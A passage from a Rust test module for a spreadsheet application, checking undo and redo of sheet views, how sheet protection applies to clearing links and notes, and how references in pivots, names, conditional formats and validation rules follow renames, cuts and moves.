    static N: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    N.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
}

/// Normal, Page Layout and Page Break Preview are not undo steps (as in Excel), so undoing or
/// redoing an edit keeps each sheet in the view it is in now, instead of putting back the view
/// of the snapshot it swaps in. Found through the command-sequence fuzz (seed 177).
#[test]
fn undo_and_redo_keep_each_sheets_view() {
    use gridcraft_model::SheetViewMode;
    let view = |s: &Session, i: usize| s.doc().unwrap().wb.sheet(i).unwrap().view;
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
    s.execute("view.pageBreakPreview", json!({})).unwrap();
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Empty);
    assert_eq!(view(&s, 0), SheetViewMode::PageBreakPreview, "undo leaves the view alone");
    s.execute("view.pageLayout", json!({})).unwrap();
    s.execute("edit.redo", json!({})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Number(1.0));
    assert_eq!(view(&s, 0), SheetViewMode::PageLayout, "redo leaves the view alone");

    // Undoing a rename: the sheet is found at its position under the restored name.
    s.execute("sheet.rename", json!({"sheet": 0, "name": "Renamed"})).unwrap();
    s.execute("view.normal", json!({})).unwrap();
    s.execute("edit.undo", json!({})).unwrap();
    assert_ne!(s.doc().unwrap().wb.sheet(0).unwrap().name, "Renamed");
    assert_eq!(view(&s, 0), SheetViewMode::Normal);

    // Undoing a new sheet: the other sheets keep theirs.
    s.execute("view.pageBreakPreview", json!({})).unwrap();
    s.execute("home.insertSheet", json!({"name": "Extra"})).unwrap();
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(s.doc().unwrap().wb.sheets.len(), 1);
    assert_eq!(view(&s, 0), SheetViewMode::PageBreakPreview);
}

#[test]
fn a_multi_step_undo_keeps_views_through_each_step() {
    // A rename and a new sheet undone in one call: neither the name nor the sheet count matches
    // between the first and last workbook, so the view is carried step by step.
    let mut s = s();
    let first = s.doc().unwrap().wb.sheet(0).unwrap().name.clone();
    s.execute("sheet.rename", json!({"sheet": 0, "name": "Renamed"})).unwrap();
    s.execute("view.pageBreakPreview", json!({"sheet": 0})).unwrap();
    s.execute("home.insertSheet", json!({"name": "Extra"})).unwrap();
    s.execute("edit.undo", json!({"steps": 2})).unwrap();
    let d = s.doc().unwrap();
    assert_eq!(d.wb.sheets.len(), 1);
    assert_eq!(d.wb.sheet(0).unwrap().name, first);
    assert_eq!(d.wb.sheet(0).unwrap().view, gridcraft_model::SheetViewMode::PageBreakPreview);
    s.execute("edit.redo", json!({"steps": 2})).unwrap();
    let d = s.doc().unwrap();
    assert_eq!((d.wb.sheets.len(), d.wb.sheet(0).unwrap().name.as_str()), (2, "Renamed"));
    assert_eq!(d.wb.sheet(0).unwrap().view, gridcraft_model::SheetViewMode::PageBreakPreview);
}

#[test]
fn a_view_kept_through_redo_doesnt_make_the_saved_workbook_dirty() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
    {
        let d = s.doc_mut().unwrap();
        d.saved = d.wb.clone();
    }
    s.execute("edit.undo", json!({})).unwrap();
    s.execute("view.pageBreakPreview", json!({})).unwrap();
    s.execute("edit.redo", json!({})).unwrap();
    let d = s.doc().unwrap();
    assert_eq!(d.wb.active().unwrap().view, gridcraft_model::SheetViewMode::PageBreakPreview);
    assert!(!d.is_dirty(), "back at the saved edits, the view alone isn't a change");
}

#[test]
fn workbook_display_options_are_commands() {
    // #3101: Show sheet tabs / horizontal / vertical scroll bar, toggling without `on`, saved with
    // the workbook and undoable.
    let mut s = Session::new();
    s.new_workbook();
    let view = |s: &Session| s.doc().unwrap().wb.view;
    assert_eq!(s.execute("view.showSheetTabs", json!({})).unwrap()["on"], json!(false));
    assert_eq!(s.execute("view.showHorizontalScrollBar", json!({"on": false})).unwrap()["on"], json!(false));
    assert_eq!(s.execute("view.showVerticalScrollBar", json!({"on": false})).unwrap()["on"], json!(false));
    let v = view(&s);
    assert!(!v.show_sheet_tabs && !v.show_horizontal_scroll && !v.show_vertical_scroll);
    let (back, _) = gridcraft_xlsx::read_xlsx(&gridcraft_xlsx::write_xlsx(&s.doc().unwrap().wb).unwrap()).unwrap();
    assert_eq!(back.view, v, "saved with the workbook");
    s.execute("edit.undo", json!({})).unwrap();
    assert!(view(&s).show_vertical_scroll);
    assert_eq!(s.execute("view.showSheetTabs", json!({})).unwrap()["on"], json!(true), "toggles back");
}

/// A link from a file can sit on a cell with nothing stored in it, past the used range (or on a
/// sheet with no cells at all). Clear Hyperlinks, and Remove Hyperlink in the cell menu, must
/// still remove it.
#[test]
fn clear_hyperlinks_removes_links_on_cells_with_nothing_stored() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "x"})).unwrap();
    let link = || gridcraft_model::Hyperlink { target: "https://example.com".into(), tooltip: None, external: true };
    let (a1, c5) = (CellRef::parse("A1").unwrap(), CellRef::parse("C5").unwrap());
    std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap().hyperlinks.insert(c5, link());
    s.execute("edit.clearHyperlinks", json!({"range": "C5"})).unwrap();
    assert!(!s.doc().unwrap().wb.active().unwrap().hyperlinks.contains_key(&c5), "the link past the used range is removed");

    // No cells at all.
    s.execute("edit.clearAll", json!({"range": "A1"})).unwrap();
    std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap().hyperlinks.insert(a1, link());
    s.execute("edit.clearHyperlinks", json!({"range": "A1"})).unwrap();
    assert!(!s.doc().unwrap().wb.active().unwrap().hyperlinks.contains_key(&a1), "the link on an empty sheet is removed");
}

/// Notes and links aren't cell contents, so the cell comparison that guards a protected sheet
/// doesn't see them go: Clear Hyperlinks and Clear Comments refuse locked cells themselves,
/// stored or not.
#[test]
fn clearing_links_and_notes_respects_sheet_protection() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "x"})).unwrap();
    let link = || gridcraft_model::Hyperlink { target: "https://example.com".into(), tooltip: None, external: true };
    let (a1, c5) = (CellRef::parse("A1").unwrap(), CellRef::parse("C5").unwrap());
    {
        let sh = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap();
        sh.hyperlinks.insert(a1, link());
        sh.hyperlinks.insert(c5, link());
    }
    s.execute("review.newNote", json!({"cell": "C5", "text": "note", "author": "Example"})).unwrap();
    s.execute("review.protectSheet", json!({})).unwrap();
    for (cmd, range) in [("edit.clearHyperlinks", "A1"), ("edit.clearHyperlinks", "C5"), ("edit.clearComments", "C5")] {
        assert!(s.execute(cmd, json!({"range": range})).is_err(), "{cmd} on locked {range}");
    }
    let sh = s.doc().unwrap().wb.active().unwrap().clone();
    assert!(sh.hyperlinks.contains_key(&a1) && sh.hyperlinks.contains_key(&c5) && sh.comments.contains_key(&c5), "nothing removed");

    s.execute("review.unprotectSheet", json!({})).unwrap();
    s.execute("edit.clearHyperlinks", json!({"range": "A1:C5"})).unwrap();
    s.execute("edit.clearComments", json!({"range": "C5"})).unwrap();
    let sh = s.doc().unwrap().wb.active().unwrap().clone();
    assert!(sh.hyperlinks.is_empty() && sh.comments.is_empty());
}

/// A removed link or note is a change to its cell even when nothing is stored there, so a
/// recorded macro's footprint lists it.
#[test]
fn clearing_links_and_notes_records_their_cells() {
    let mut s = s();
    let c5 = CellRef::parse("C5").unwrap();
    std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb)
        .sheet_mut(0)
        .unwrap()
        .hyperlinks
        .insert(c5, gridcraft_model::Hyperlink { target: "https://example.com".into(), tooltip: None, external: true });
    s.execute("review.newNote", json!({"cell": "D7", "text": "note", "author": "Example"})).unwrap();
    s.doc_mut().unwrap().touched = Some(Vec::new());
    s.execute("edit.clearHyperlinks", json!({"range": "C5"})).unwrap();
    s.execute("edit.clearComments", json!({"range": "D7"})).unwrap();
    let touched: Vec<String> = s.doc().unwrap().touched.clone().unwrap_or_default().into_iter().map(|(_, c)| c.a1()).collect();
    assert!(touched.contains(&"C5".to_string()) && touched.contains(&"D7".to_string()), "{touched:?}");
}

/// The locked-cell check for notes and links keeps Allow Edit Ranges: a range without a password
/// allows them at once, one with a password once it's unlocked in this session.
#[test]
fn clearing_links_and_notes_keeps_allow_edit_ranges() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "x"})).unwrap();
    let link = || gridcraft_model::Hyperlink { target: "https://example.com".into(), tooltip: None, external: true };
    let (a1, c5) = (CellRef::parse("A1").unwrap(), CellRef::parse("C5").unwrap());
    {
        let sh = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap();
        sh.hyperlinks.insert(a1, link());
        sh.hyperlinks.insert(c5, link());
    }
    s.execute("review.newNote", json!({"cell": "C5", "text": "note", "author": "Example"})).unwrap();
    // Ranges are added before protecting: a protected sheet refuses `add`.
    s.execute("review.allowEditRanges", json!({"action": "add", "title": "Open", "range": "A1"})).unwrap();
    s.execute("review.allowEditRanges", json!({"action": "add", "title": "Kept", "range": "C5", "password": "example"})).unwrap();
    s.execute("review.protectSheet", json!({})).unwrap();

    s.execute("edit.clearHyperlinks", json!({"range": "A1"})).unwrap();
    assert!(s.execute("edit.clearComments", json!({"range": "C5"})).is_err(), "a password range stays locked until unlocked");
    s.execute("review.allowEditRanges", json!({"action": "unlock", "title": "Kept", "password": "example"})).unwrap();
    s.execute("edit.clearHyperlinks", json!({"range": "C5"})).unwrap();
    s.execute("edit.clearComments", json!({"range": "C5"})).unwrap();
    let sh = s.doc().unwrap().wb.active().unwrap().clone();
    assert!(sh.hyperlinks.is_empty() && sh.comments.is_empty());
}

#[test]
fn replace_does_not_search_hidden_formula_source() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "=SEQUENCE(3)*7"})).unwrap();
    s.execute("home.formatCells", json!({"range": "A1", "style": {"protection": {"locked": true, "hidden": true}}})).unwrap();
    s.execute("review.protectSheet", json!({})).unwrap();
    // Both give the same answer, and it is not an error: a hidden formula's source is not searched.
    let hit = s.execute("edit.replace", json!({"what": "SEQUENCE", "with": "X"})).unwrap();
    let miss = s.execute("edit.replace", json!({"what": "NOSUCHTEXT", "with": "X"})).unwrap();
    assert_eq!(hit, miss);
    assert_eq!(hit["replaced"], json!(0), "{hit}");
}

#[test]
fn formulatext_does_not_reveal_a_hidden_formula() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "=1+1"})).unwrap();
    s.execute("home.formatCells", json!({"range": "A1", "style": {"protection": {"locked": false, "hidden": true}}})).unwrap();
    s.execute("home.formatCells", json!({"range": "B1", "style": {"protection": {"locked": false}}})).unwrap();
    s.execute("cell.set", json!({"cell": "B1", "input": "=FORMULATEXT(A1)"})).unwrap();
    assert_eq!(v(&s, "B1"), Value::from("=1+1"), "not protected yet");
    s.execute("review.protectSheet", json!({})).unwrap();
    // Without entering the formula again: protecting recalculates what reads the protection.
    assert_eq!(v(&s, "B1"), Value::Error(gridcraft_core::CellError::NA));
    s.execute("cell.set", json!({"cell": "B1", "input": "=FORMULATEXT(A1)"})).unwrap();
    assert_eq!(v(&s, "B1"), Value::Error(gridcraft_core::CellError::NA));
    s.execute("review.unprotectSheet", json!({})).unwrap();
    assert_eq!(v(&s, "B1"), Value::from("=1+1"), "unprotecting shows it again without re-entering");
}

#[test]
fn protected_sheet_refuses_layout_commands_its_permissions_do_not_allow() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["h"], [1], [2]]})).unwrap();
    s.execute("data.filter", json!({"range": "A1:A3"})).unwrap();
    s.execute("review.protectSheet", json!({})).unwrap();
    for (id, params) in [
        ("home.rowHeight", json!({"rows": "1:1", "height": 40})),
        ("home.columnWidth", json!({"cols": "A:A", "width": 80})),
        ("data.group", json!({"rows": "2:3"})),
        ("data.showLevels", json!({"rows": 1})),
        ("data.clearFilter", json!({})),
        ("data.reapply", json!({})),
        ("insert.picture", json!({"base64": "iVBORw0KGgo="})),
    ] {
        let err = s.execute(id, params).expect_err(id).to_string();
        assert!(err.contains("protected"), "{id}: {err}");
    }
    // With the permissions ticked the same layout commands run.
    s.execute("review.unprotectSheet", json!({})).unwrap();
    s.execute("review.protectSheet", json!({"formatRows": true, "formatColumns": true, "autofilter": true})).unwrap();
    for (id, params) in [
        ("home.rowHeight", json!({"rows": "1:1", "height": 40})),
        ("home.columnWidth", json!({"cols": "A:A", "width": 80})),
        ("data.reapply", json!({})),
    ] {
        s.execute(id, params).unwrap_or_else(|e| panic!("{id}: {e}"));
    }
}

#[test]
fn an_edit_range_limited_to_windows_users_stays_locked() {
    use gridcraft_model::EditRange;
    let mut s = s();
    let a1 = CellRef::parse("A1").unwrap();
    let range = |sd: Option<&str>| EditRange {
        title: "T".into(),
        ranges: vec![gridcraft_core::RangeRef::cell(a1)],
        password: None,
        security_descriptor: sd.map(str::to_string),
    };
    let sh = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap();
    sh.edit_ranges.push(range(None));
    assert!(crate::cmd::locked_cell_error(sh, a1, &[]).is_none(), "an open range");
    sh.edit_ranges = vec![range(Some("D:(A;;GA;;;WD)"))];
    assert!(crate::cmd::locked_cell_error(sh, a1, &[]).is_some(), "a user-limited range");
}

#[test]
fn pivot_new_sheet_destination_respects_workbook_structure_protection() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Region", "Sales"], ["N", 1], ["S", 2]]})).unwrap();
    s.execute("review.protectWorkbook", json!({"on": true})).unwrap();
    for dest in ["new", "NEW", " new ", ""] {
        assert!(s.execute("insert.pivotTable", json!({"source": "A1:B3", "destination": dest})).is_err(), "destination {dest:?}");
    }
    assert!(s.execute("insert.pivotTable", json!({"source": "A1:B3", "location": "New"})).is_err());
}

/// Renaming a sheet renames a PivotTable's source to it, and the PivotTable still refreshes.
#[test]
fn sheet_rename_renames_a_pivot_source() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1:B3", "values": [["Region", "Sales"], ["East", 1], ["West", 2]]})).unwrap();
    s.execute("insert.pivotTable", json!({"source": "Sheet1!$A$1:$B$3", "destination": "Sheet1!E3", "rows": ["Region"], "values": ["Sales"]}))
        .unwrap();
    s.execute("sheet.rename", json!({"name": "Data"})).unwrap();
    let wb = &s.doc().unwrap().wb;
    assert_eq!(wb.sheets[0].pivots[0].source, "Data!$A$1:$B$3");
    s.execute("pivot.refresh", json!({})).unwrap();
}

/// A defined name's references are on no sheet, whatever a sheet is called: inserting rows on
/// a sheet named with a control character leaves a name's unqualified reference alone.
#[test]
fn names_are_on_no_sheet_whatever_the_sheet_is_called() {
    let mut s = s();
    s.execute("formulas.defineName", json!({"name": "Nm", "refersTo": "=$A$1"})).unwrap();
    let before = s.doc().unwrap().wb.names.iter().find(|n| n.name == "Nm").map(|n| n.formula.clone());
    s.execute("sheet.rename", json!({"sheet": 0, "name": "\u{0}"})).unwrap();
    s.execute("home.insertRows", json!({"rows": "1:1"})).unwrap();
    let after = s.doc().unwrap().wb.names.iter().find(|n| n.name == "Nm").map(|n| n.formula.clone());
    assert!(before.is_some());
    assert_eq!(before, after);
}

/// Renaming a sheet copies only the sheets whose references change: a sheet that doesn't name
/// it stays shared with the undo snapshot.
#[test]
fn sheet_rename_leaves_untouched_sheets_shared() {
    let mut s = s();
    s.execute("home.insertSheet", json!({"name": "Other"})).unwrap();
    s.execute("home.insertSheet", json!({"name": "Third"})).unwrap();
    s.execute("cell.set", json!({"cell": "Other!A1", "input": "=Sheet1!A1+1"})).unwrap();
    // A constant: the full recalculation after a rename writes every formula cell's value, which
    // copies a sheet that holds formulas whatever the rewrite does.
    s.execute("cell.set", json!({"cell": "Third!A1", "input": "5"})).unwrap();
    let before = s.doc().unwrap().wb.clone();
    s.execute("sheet.rename", json!({"sheet": "Sheet1", "name": "Data"})).unwrap();
    let wb = &s.doc().unwrap().wb;
    let shared = |name: &str| std::sync::Arc::ptr_eq(&wb.sheets[wb.sheet_index(name).unwrap()], &before.sheets[before.sheet_index(name).unwrap()]);
    assert!(shared("Third"), "Third doesn't name Sheet1");
    assert!(!shared("Other"), "Other's formula names Sheet1");
}

/// Every edit that moves references moves those in conditional formats and validation too:
/// inserting rows, renaming a name, deleting a sheet; and deleting a sheet leaves arrays be.
#[test]
fn reference_edits_reach_conditional_formats_and_validation() {
    let mut s = s();
    s.execute("home.insertSheet", json!({"name": "Lists"})).unwrap();
    s.execute("range.setValues", json!({"range": "Lists!A1:A3", "values": [["a"], ["b"], ["c"]]})).unwrap();
    s.execute("sheet.activate", json!({"sheet": 1})).ok();
    let sheet1 = s.doc().unwrap().wb.sheet_index("Sheet1").unwrap();
    s.execute("sheet.activate", json!({"sheet": sheet1})).ok();
    s.execute("formulas.defineName", json!({"name": "Opts", "refersTo": "=Lists!$A$1:$A$3"})).unwrap();
    s.execute("data.validation", json!({"range": "Sheet1!B1:B5", "type": "list", "formula1": "=Opts"})).unwrap();
    s.execute("data.validation", json!({"range": "Sheet1!E1:E5", "type": "list", "formula1": "=Lists!$A$1:$A$3"})).unwrap();
    s.execute(
        "home.conditionalFormat",
        json!({"range": "Sheet1!C1:C5", "rule": {"type": "expression", "formula": "=C1>$D$3"}, "style": {"fill": "#FFC7CE"}}),
    )
    .unwrap();
    s.execute("cell.set", json!({"cell": "Sheet1!G2", "input": "=B2:B3*2", "array": true})).unwrap();
    let sh = |s: &Session| s.doc().unwrap().wb.sheet(s.doc().unwrap().wb.sheet_index("Sheet1").unwrap()).cloned().unwrap();
    // Inserting a row above moves the rule's references with its range.
    s.execute("home.insertRows", json!({"rows": "1:1", "sheet": "Sheet1"})).unwrap();
    let rule = match &sh(&s).cond_formats[0].rule {
        gridcraft_model::CfRule::Expression { formula, .. } => formula.clone(),
        _ => String::new(),
    };
    assert_eq!(rule.trim_start_matches('='), "C2>$D$4");
    // Renaming a name renames it in validation lists.
    s.execute("formulas.defineName", json!({"name": "Choices", "oldName": "Opts", "refersTo": "=Lists!$A$1:$A$3"})).unwrap();
    assert!(sh(&s).validations.iter().any(|v| v.f1.trim_start_matches('=') == "Choices"));
    // Deleting the sheet a list comes from makes it #REF!, and keeps the array formula.
    let array_before = sh(&s).cells.iter().find_map(|(_, c)| c.formula.as_ref().and_then(|f| f.array));
    assert!(array_before.is_some());
    let lists = s.doc().unwrap().wb.sheet_index("Lists").unwrap();
    s.execute("home.deleteSheet", json!({"sheet": lists})).unwrap();
    assert!(sh(&s).validations.iter().any(|v| v.f1.contains("#REF!")), "{:?}", sh(&s).validations.iter().map(|v| v.f1.clone()).collect::<Vec<_>>());
    assert_eq!(sh(&s).cells.iter().find_map(|(_, c)| c.formula.as_ref().and_then(|f| f.array)), array_before);
}

/// A copied sheet's chart plots the copy's data.
#[test]
fn a_copied_sheets_chart_plots_the_copy() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1:B3", "values": [["x", "y"], ["a", 1], ["b", 2]]})).unwrap();
    s.execute("insert.chart", json!({"range": "A1:B3", "type": "column"})).unwrap();
    // A series name written as a formula on no sheet keeps its `=`, and stays a reference.
    std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap().charts[0].series[0].name = Some("=A1".into());
    s.execute("sheet.move", json!({"sheet": 0, "to": 1, "copy": true})).unwrap();
    let wb = &s.doc().unwrap().wb;
    let copy = wb.sheets.iter().find(|sh| sh.name != "Sheet1").unwrap();
    assert!(copy.charts[0].series[0].values.contains(&copy.name), "{}", copy.charts[0].series[0].values);
    assert_eq!(copy.charts[0].series[0].name.as_deref(), Some("=A1"));
}

/// A rule's formulas follow its ranges: deleting its top-left row re-hosts them at the cell
/// that takes its place, and a cut takes rules with their cells, moving their references once.
#[test]
fn rule_formulas_follow_their_ranges() {
    let rule_text = |s: &Session| -> (Vec<String>, Vec<String>) {
        let sh = s.doc().unwrap().wb.sheets[0].clone();
        let cf = sh.cond_formats.iter().map(|c| match &c.rule {
            gridcraft_model::CfRule::Expression { formula, .. } => {
                format!("{}@{}", formula.trim_start_matches('='), c.ranges.iter().map(|r| r.a1()).collect::<Vec<_>>().join(","))
            }
            _ => String::new(),
        });
        let dv = sh
            .validations
            .iter()
            .map(|v| format!("{}@{}", v.f1.trim_start_matches('='), v.ranges.iter().map(|r| r.a1()).collect::<Vec<_>>().join(",")));
        (cf.collect(), dv.collect())
    };
    let mut s = s();
    s.execute("home.conditionalFormat", json!({"range": "A2:A5", "rule": {"type": "expression", "formula": "=B2>0"}, "style": {"fill": "#FFC7CE"}}))
        .unwrap();
    s.execute("data.validation", json!({"range": "C2:C5", "type": "custom", "formula1": "=D2>0"})).unwrap();
    s.execute("home.deleteRows", json!({"rows": "2:2"})).unwrap();
    assert_eq!(rule_text(&s), (vec!["B2>0@A2:A4".to_string()], vec!["D2>0@C2:C4".to_string()]));
    // Cut A2:A4 to F2: the rule goes with the cells, still testing the cells beside them.
    s.execute("edit.cut", json!({"range": "A2:A4"})).unwrap();
    s.execute("edit.paste", json!({"at": "F2"})).unwrap();
    assert_eq!(rule_text(&s).0, vec!["B2>0@F2:F4".to_string()]);
    // An overlapping cut moves a self-referring rule's reference once.
    let mut s = super::tests::s();
    s.execute("data.validation", json!({"range": "A1:A2", "type": "custom", "formula1": "=A1>0"})).unwrap();
    s.execute("edit.cut", json!({"range": "A1:A2"})).unwrap();
    s.execute("edit.paste", json!({"at": "A2"})).unwrap();
    assert_eq!(rule_text(&s).1, vec!["A2>0@A2:A3".to_string()]);
}

/// Renaming a table renames every reference to it (a PivotTable's source, a name, a rule) and
/// leaves formulas that don't name it, legacy arrays included, as they are.
#[test]
fn table_rename_renames_every_reference() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1:B3", "values": [["k", "v"], ["a", 1], ["b", 2]]})).unwrap();
    s.execute("insert.table", json!({"range": "A1:B3"})).unwrap();
    let table = s.doc().unwrap().wb.sheets[0].tables[0].name.clone();
    s.execute("cell.set", json!({"cell": "D1", "input": "=A2:A3", "array": true})).unwrap();
    s.execute("formulas.defineName", json!({"name": "Tot", "refersTo": format!("=SUM({table}[v])")})).unwrap();
    s.execute(
        "home.conditionalFormat",
        json!({"range": "F1:F3", "rule": {"type": "expression", "formula": format!("=COUNT({table}[v])>0")}, "style": {"fill": "#FFC7CE"}}),
    )
    .unwrap();
    s.execute("insert.pivotTable", json!({"source": table, "destination": "Sheet1!H3", "rows": ["k"], "values": ["v"]})).unwrap();
    let array = s.doc().unwrap().wb.sheets[0].cell(CellRef::new(0, 3)).and_then(|c| c.formula.clone()).unwrap();
    s.execute("table.rename", json!({"table": table, "name": "Data"})).unwrap();
    let wb = &s.doc().unwrap().wb;
    let sh = &wb.sheets[0];
    assert_eq!(
        sh.cell(CellRef::new(0, 3)).and_then(|c| c.formula.clone()).map(|f| (f.text.clone(), f.array, f.dynamic)),
        Some((array.text.clone(), array.array, array.dynamic))
    );
    assert_eq!(wb.names.iter().find(|n| n.name == "Tot").map(|n| n.formula.clone()).as_deref(), Some("SUM(Data[v])"));
    assert!(matches!(&sh.cond_formats[0].rule, gridcraft_model::CfRule::Expression { formula, .. } if formula.contains("Data[v]")));
    assert_eq!(sh.pivots[0].source, "Data");
    s.execute("data.refreshAll", json!({})).unwrap();
}

/// Rules moved whole keep their formulas; a range an edit leaves in place keeps them too;
/// thresholds are read as written; a cut to another sheet names the source sheet's cells.
#[test]
fn rules_moved_whole_or_left_in_place_keep_their_formulas() {
    let cf = |s: &Session, sheet: usize| -> Vec<String> {
        s.doc().unwrap().wb.sheets[sheet]
            .cond_formats
            .iter()
            .map(|c| match &c.rule {
                gridcraft_model::CfRule::Expression { formula, .. } => {
                    format!("{}@{}", formula.trim_start_matches('='), c.ranges.iter().map(|r| r.a1()).collect::<Vec<_>>().join(","))
                }
                gridcraft_model::CfRule::DataBar { min: gridcraft_model::CfValueKind::Formula(f), .. } => format!("bar {f}"),
                _ => String::new(),
            })
            .collect()
    };
    let rule = |s: &mut Session, range: &str, f: &str| {
        s.execute("home.clearRules", json!({"whole": true})).ok();
        s.execute("home.conditionalFormat", json!({"range": range, "rule": {"type": "expression", "formula": f}, "style": {"fill": "#FFC7CE"}}))
            .unwrap();
    };
    let mut s = s();
    rule(&mut s, "B1:B5", "=C1>0");
    s.execute("sheet.moveColumns", json!({"cols": "B:B", "before": 4})).unwrap();
    // The column moved whole: the rule tests the column that was beside it (C, now B), as a
    // formula there would.
    assert_eq!(cf(&s, 0), vec!["B1>0@D1:D5".to_string()]);
    let mut s = super::tests::s();
    rule(&mut s, "A1:C1", "=B1>0");
    s.execute("home.deleteCells", json!({"range": "A1", "shift": "up"})).unwrap();
    assert_eq!(cf(&s, 0), vec!["B1>0@A1:C1".to_string()]);
    // A data bar's threshold formula is read as written: deleting the first row only moves it.
    let mut s = super::tests::s();
    s.execute("home.conditionalFormat", json!({"range": "A1:A10", "rule": {"type": "dataBar", "min": {"type": "formula", "value": "MIN(C1:C10)"}}}))
        .unwrap();
    assert_eq!(cf(&s, 0), vec!["bar MIN(C1:C10)".to_string()]);
    s.execute("home.deleteRows", json!({"rows": "1:1"})).unwrap();
    assert_eq!(cf(&s, 0), vec!["bar MIN(C1:C9)".to_string()]);
    // A cut to another sheet: the rule still reads the source sheet's cells.
    let mut s = super::tests::s();
    s.execute("home.insertSheet", json!({"name": "Two"})).unwrap();
    let one = s.doc().unwrap().wb.sheet_index("Sheet1").unwrap();
    let two = s.doc().unwrap().wb.sheet_index("Two").unwrap();
    s.execute("sheet.activate", json!({"sheet": one})).ok();
    s.execute(
        "home.conditionalFormat",
        json!({"range": "Sheet1!A2:A4", "rule": {"type": "expression", "formula": "=B2>0"}, "style": {"fill": "#FFC7CE"}}),
    )
    .unwrap();
    s.execute("edit.cut", json!({"range": "Sheet1!A2:A4"})).unwrap();
    s.execute("sheet.activate", json!({"sheet": two})).unwrap();
    s.execute("edit.paste", json!({"at": "F2"})).unwrap();
    assert_eq!(cf(&s, two), vec!["Sheet1!B2>0@F2:F4".to_string()]);
    // A data bar's threshold goes along too: its cells into the block, the others on Sheet1.
    s.execute("sheet.activate", json!({"sheet": one})).unwrap();
    s.execute(
        "home.conditionalFormat",
        json!({"range": "Sheet1!H1:H10", "rule": {"type": "dataBar", "min": {"type": "formula", "value": "MIN(H1:H10,C1:C10)"}}}),
    )
    .unwrap();
    s.execute("edit.cut", json!({"range": "Sheet1!H1:H10"})).unwrap();
    s.execute("sheet.activate", json!({"sheet": two})).unwrap();
    s.execute("edit.paste", json!({"at": "K1"})).unwrap();
    assert_eq!(cf(&s, two).last().map(String::as_str), Some("bar MIN(Two!K1:K10,Sheet1!C1:C10)"));
}

/// A cut moves the rules its cells hold when it is pasted, not those they held when it was cut.
#[test]
fn a_cut_moves_the_rules_its_cells_hold_at_paste() {
    let mut s = s();
    s.execute("home.conditionalFormat", json!({"range": "A1:A3", "rule": {"type": "expression", "formula": "=A1>0"}, "style": {"fill": "#FFC7CE"}}))
        .unwrap();
    s.execute("edit.cut", json!({"range": "A1:A3"})).unwrap();
    s.execute("home.clearRules", json!({"whole": true})).unwrap();
    s.execute("data.validation", json!({"range": "A1:A3", "type": "custom", "formula1": "=A1>0"})).unwrap();
    s.execute("edit.paste", json!({"at": "D1"})).unwrap();
    let sh = &s.doc().unwrap().wb.sheets[0];
    assert!(sh.cond_formats.is_empty(), "a cleared rule came back: {:?}", sh.cond_formats);
    let dv: Vec<String> = sh.validations.iter().flat_map(|v| v.ranges.iter().map(|r| r.a1())).collect();
    assert_eq!(dv, vec!["D1:D3".to_string()]);
}

/// A cut whose sheet is renamed before the paste still moves its rules and the references to
/// its cells: the move is made on the sheet as it is now named, not as the clipboard saw it.
#[test]
fn a_cut_pasted_after_its_sheet_is_renamed_moves_its_rules() {
    let mut s = s();
    s.execute("home.conditionalFormat", json!({"range": "A1:A3", "rule": {"type": "expression", "formula": "=A1>0"}, "style": {"fill": "#FFC7CE"}}))
        .unwrap();
    s.execute("data.validation", json!({"range": "A1:A3", "type": "custom", "formula1": "=A1>0"})).unwrap();
    s.execute("cell.set", json!({"cell": "B5", "input": "=A1"})).unwrap();
    s.execute("edit.cut", json!({"range": "A1:A3"})).unwrap();
    s.execute("sheet.rename", json!({"name": "Data"})).unwrap();
    s.execute("edit.paste", json!({"at": "D1"})).unwrap();
    let sh = &s.doc().unwrap().wb.sheets[0];
    let cf: Vec<String> = sh
        .cond_formats
        .iter()
        .map(|c| match &c.rule {
            gridcraft_model::CfRule::Expression { formula, .. } => format!("{}@{}", formula.trim_start_matches('='), c.ranges[0].a1()),
            _ => String::new(),
        })
        .collect();
    assert_eq!(cf, vec!["D1>0@D1:D3".to_string()]);
    let dv: Vec<String> = sh.validations.iter().map(|v| format!("{}@{}", v.f1.trim_start_matches('='), v.ranges[0].a1())).collect();
    assert_eq!(dv, vec!["D1>0@D1:D3".to_string()]);
    assert_eq!(s.execute("cell.get", json!({"cell": "B5"})).unwrap()["formula"], "=D1");
}

/// Moving a column out of a wider rule takes its part of the rule with it, as a cut does: every
/// cell, moved or not, still checks itself.
#[test]
fn moving_a_column_out_of_a_rule_keeps_every_cell_checking_itself() {
    let mut s = s();
    s.execute("data.validation", json!({"range": "A1:C3", "type": "custom", "formula1": "=A1>0"})).unwrap();
    s.execute("sheet.moveColumns", json!({"cols": "A:A", "before": 4})).unwrap();
    let ok = |s: &Session, at: &str, input: &str| {
        crate::cmd::data::check_validation(&s.doc().unwrap().wb, 0, gridcraft_core::CellRef::parse(at).unwrap(), input).is_none()
    };
    // Old A is now D; old B and C are A and B.
    for at in ["A1", "B2", "D3"] {
